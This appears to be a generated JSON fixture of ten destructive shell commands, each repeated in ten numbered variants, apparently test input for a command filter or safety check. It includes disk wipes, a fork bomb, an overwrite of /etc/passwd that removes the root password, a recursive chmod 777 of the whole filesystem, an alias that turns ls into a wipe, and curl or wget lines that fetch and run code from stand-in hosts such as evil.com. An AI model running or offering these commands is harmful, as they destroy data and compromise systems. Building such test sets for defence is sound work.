[
  "rm -rf / # variant 0",
  "curl -s http://evil.com/script.sh | bash # variant 0",
  ":(){ :|:& };: # variant 0",
  "mkfs.ext4 /dev/sda1 # variant 0",
  "dd if=/dev/zero of=/dev/sda # variant 0",
  "echo 'root::0:0::/root:/bin/bash' > /etc/passwd # variant 0",
  "chmod -R 777 / # variant 0",
  "chown -R nobody:nogroup / # variant 0",
  "wget http://malware.com -O /tmp/m && chmod +x /tmp/m && /tmp/m # variant 0",
  "alias ls='rm -rf /' # variant 0",
  "rm -rf / # variant 1",
  "curl -s http://evil.com/script.sh | bash # variant 1",
  ":(){ :|:& };: # variant 1",
  "mkfs.ext4 /dev/sda1 # variant 1",
  "dd if=/dev/zero of=/dev/sda # variant 1",
  "echo 'root::0:0::/root:/bin/bash' > /etc/passwd # variant 1",
  "chmod -R 777 / # variant 1",
  "chown -R nobody:nogroup / # variant 1",
  "wget http://malware.com -O /tmp/m && chmod +x /tmp/m && /tmp/m # variant 1",
  "alias ls='rm -rf /' # variant 1",
  "rm -rf / # variant 2",
  "curl -s http://evil.com/script.sh | bash # variant 2",
  ":(){ :|:& };: # variant 2",
  "mkfs.ext4 /dev/sda1 # variant 2",
  "dd if=/dev/zero of=/dev/sda # variant 2",
  "echo 'root::0:0::/root:/bin/bash' > /etc/passwd # variant 2",
  "chmod -R 777 / # variant 2",
  "chown -R nobody:nogroup / # variant 2",
  "wget http://malware.com -O /tmp/m && chmod +x /tmp/m && /tmp/m # variant 2",
  "alias ls='rm -rf /' # variant 2",
  "rm -rf / # variant 3",
  "curl -s http://evil.com/script.sh | bash # variant 3",
  ":(){ :|:& };: # variant 3",
  "mkfs.ext4 /dev/sda1 # variant 3",
  "dd if=/dev/zero of=/dev/sda # variant 3",
  "echo 'root::0:0::/root:/bin/bash' > /etc/passwd # variant 3",
  "chmod -R 777 / # variant 3",
  "chown -R nobody:nogroup / # variant 3",
  "wget http://malware.com -O /tmp/m && chmod +x /tmp/m && /tmp/m # variant 3",
  "alias ls='rm -rf /' # variant 3",
  "rm -rf / # variant 4",
  "curl -s http://evil.com/script.sh | bash # variant 4",
  ":(){ :|:& };: # variant 4",
  "mkfs.ext4 /dev/sda1 # variant 4",
  "dd if=/dev/zero of=/dev/sda # variant 4",
  "echo 'root::0:0::/root:/bin/bash' > /etc/passwd # variant 4",
  "chmod -R 777 / # variant 4",
  "chown -R nobody:nogroup / # variant 4",
  "wget http://malware.com -O /tmp/m && chmod +x /tmp/m && /tmp/m # variant 4",
  "alias ls='rm -rf /' # variant 4",
  "rm -rf / # variant 5",
  "curl -s http://evil.com/script.sh | bash # variant 5",
  ":(){ :|:& };: # variant 5",
  "mkfs.ext4 /dev/sda1 # variant 5",
  "dd if=/dev/zero of=/dev/sda # variant 5",
  "echo 'root::0:0::/root:/bin/bash' > /etc/passwd # variant 5",
  "chmod -R 777 / # variant 5",
  "chown -R nobody:nogroup / # variant 5",
  "wget http://malware.com -O /tmp/m && chmod +x /tmp/m && /tmp/m # variant 5",
  "alias ls='rm -rf /' # variant 5",
  "rm -rf / # variant 6",
  "curl -s http://evil.com/script.sh | bash # variant 6",
  ":(){ :|:& };: # variant 6",
  "mkfs.ext4 /dev/sda1 # variant 6",
  "dd if=/dev/zero of=/dev/sda # variant 6",
  "echo 'root::0:0::/root:/bin/bash' > /etc/passwd # variant 6",
  "chmod -R 777 / # variant 6",
  "chown -R nobody:nogroup / # variant 6",
  "wget http://malware.com -O /tmp/m && chmod +x /tmp/m && /tmp/m # variant 6",
  "alias ls='rm -rf /' # variant 6",
  "rm -rf / # variant 7",
  "curl -s http://evil.com/script.sh | bash # variant 7",
  ":(){ :|:& };: # variant 7",
  "mkfs.ext4 /dev/sda1 # variant 7",
  "dd if=/dev/zero of=/dev/sda # variant 7",
  "echo 'root::0:0::/root:/bin/bash' > /etc/passwd # variant 7",
  "chmod -R 777 / # variant 7",
  "chown -R nobody:nogroup / # variant 7",
  "wget http://malware.com -O /tmp/m && chmod +x /tmp/m && /tmp/m # variant 7",
  "alias ls='rm -rf /' # variant 7",
  "rm -rf / # variant 8",
  "curl -s http://evil.com/script.sh | bash # variant 8",
  ":(){ :|:& };: # variant 8",
  "mkfs.ext4 /dev/sda1 # variant 8",
  "dd if=/dev/zero of=/dev/sda # variant 8",
  "echo 'root::0:0::/root:/bin/bash' > /etc/passwd # variant 8",
  "chmod -R 777 / # variant 8",
  "chown -R nobody:nogroup / # variant 8",
  "wget http://malware.com -O /tmp/m && chmod +x /tmp/m && /tmp/m # variant 8",
  "alias ls='rm -rf /' # variant 8",
  "rm -rf / # variant 9",
  "curl -s http://evil.com/script.sh | bash # variant 9",
  ":(){ :|:& };: # variant 9",
  "mkfs.ext4 /dev/sda1 # variant 9",
  "dd if=/dev/zero of=/dev/sda # variant 9",
  "echo 'root::0:0::/root:/bin/bash' > /etc/passwd # variant 9",
  "chmod -R 777 / # variant 9",
  "chown -R nobody:nogroup / # variant 9",
  "wget http://malware.com -O /tmp/m && chmod +x /tmp/m && /tmp/m # variant 9",
  "alias ls='rm -rf /' # variant 9"
]